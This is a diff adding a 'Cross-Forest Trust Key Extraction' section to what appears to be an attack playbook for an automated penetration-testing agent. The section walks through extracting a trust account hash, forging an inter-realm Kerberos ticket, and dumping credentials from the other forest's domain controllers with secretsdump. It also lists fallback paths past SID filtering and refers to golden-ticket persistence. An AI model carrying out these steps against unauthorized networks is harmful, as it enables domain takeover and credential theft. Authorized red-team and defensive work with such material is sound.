@@ -355,6 +355,34 @@ If raise_child fails, manually forge ticket with Enterprise Admin SID:
 **Note:** Silver ticket forging is done using impacket's ticketer.py directly if needed.
 Golden ticket is preferred for persistence after obtaining krbtgt hash.
 
+### Cross-Forest Trust Key Extraction
+When DA is achieved in one forest and a cross-forest trust exists:
+```
+1. extract_trust_key(
+       domain="contoso.local",
+       dc_ip="DC_IP",
+       target_domain="fabrikam.local",
+       username="Administrator",
+       password="pass"
+   )
+   → Gets FABRIKAM$ trust account NTLM hash
+
+2. create_inter_realm_ticket(
+       source_domain="contoso.local",
+       source_sid="S-1-5-21-source...",
+       trust_key="aad3b435...:ntlm_hash",
+       target_domain="fabrikam.local",
+       target_sid="S-1-5-21-target..."
+   )
+   → Forges inter-realm TGT
+
+3. Use ticket for secretsdump against fabrikam.local DCs
+```
+
+**Important:** SID filtering blocks RID<1000 across forest trusts. If inter-realm
+ticket path fails, look for organic paths: MSSQL links, ACL chains, or foreign
+security principals within the target forest.
+
 ## Local Privilege Escalation
 
 When you have a shell but need SYSTEM (e.g., SeImpersonatePrivilege):
